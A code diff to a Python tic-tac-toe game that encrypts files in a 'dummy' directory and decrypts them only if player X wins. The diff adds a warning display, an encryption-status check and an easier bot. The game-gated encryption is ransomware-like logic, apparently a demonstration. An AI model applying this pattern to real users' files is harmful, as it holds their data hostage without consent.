@@ -13,6 +13,8 @@ def main():
         encrypt_files(DUMMY_FILES_DIR)
         set_encryption_status("encrypted")
 
+    show_warning()  # Display the encryption warning
+
     running = True
     player = "X"
     winner = None
@@ -27,7 +29,7 @@ def main():
             game_over = True
             msg = f"Winner: {winner}" if winner else "Draw"
             draw_text_centered(msg, MESSAGE_FONT, BLACK, -50)
-            if winner == "X":
+            if winner == "X" and is_encrypted():
                 decrypt_files(DUMMY_FILES_DIR)  # Decrypt files only if X wins
                 set_encryption_status("decrypted")
 
@@ -44,7 +46,8 @@ def main():
                     winner = check_winner()
 
                     if not winner and not is_draw():
-                        bot_move = hard_bot(GRID, "O", "X")
+                        bot = medium_bot  # Change to random_bot for easier bot or to hard_bot for impossible bot
+                        bot_move = bot(GRID, "O", "X")
                         if bot_move:
                             GRID[bot_move[0]][bot_move[1]] = "O"
                             winner = check_winner()
